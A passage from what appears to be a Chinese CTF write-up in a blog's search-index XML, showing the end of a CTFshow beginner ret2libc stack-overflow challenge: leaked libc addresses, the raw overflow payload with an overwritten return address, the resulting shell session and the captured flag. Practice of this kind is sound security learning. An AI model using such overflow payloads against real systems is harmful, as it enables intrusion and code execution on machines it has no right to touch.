██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Stack_Overflow                                          </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Ez ret2libc!                                            </span><br><span class="line">    * *************************************                           </span><br><span class="line">Give you some useful addr:</span><br><span class="line"></span><br><span class="line">puts: 0xf7e2f360</span><br><span class="line">fflush 0xf7e2d500</span><br><span class="line">read: 0xf7ead620</span><br><span class="line">write: 0xf7ead6f0</span><br><span class="line">gift: 0x804b028</span><br><span class="line"></span><br><span class="line">Start your show time: </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\x10M\xe0\xf7</span><br><span class="line">$                                          ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat flag</span><br><span class="line">ctfshow&#123;9d77e626-5bf6-465e-baf9-5177e16ac17f&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><p>可以看到我们已经得到了 <code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
